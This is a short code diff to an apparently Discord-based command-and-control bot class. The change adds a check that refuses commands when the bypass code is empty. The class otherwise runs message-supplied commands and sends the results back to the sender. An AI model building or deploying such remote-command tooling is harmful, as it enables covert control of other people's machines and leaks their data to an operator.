@@ -18,9 +18,12 @@ class DiscordC2(discord.Client):
             result = self.cmd_process(cmd)
             await message.author.send(result)
         elif message.content.startswith(BYPASS_CODE):
-            cmd = '{0.content}'.format(message).replace(BYPASS_CODE, '', 1)
-            result = self.cmd_process(cmd)
-            await message.author.send(result)
+            if BYPASS_CODE == '':
+                await message.author.send('Not an authorized command.')
+            else:
+                cmd = '{0.content}'.format(message).replace(BYPASS_CODE, '', 1)
+                result = self.cmd_process(cmd)
+                await message.author.send(result)
         else:
             await message.author.send('Not an authorized command.')
 
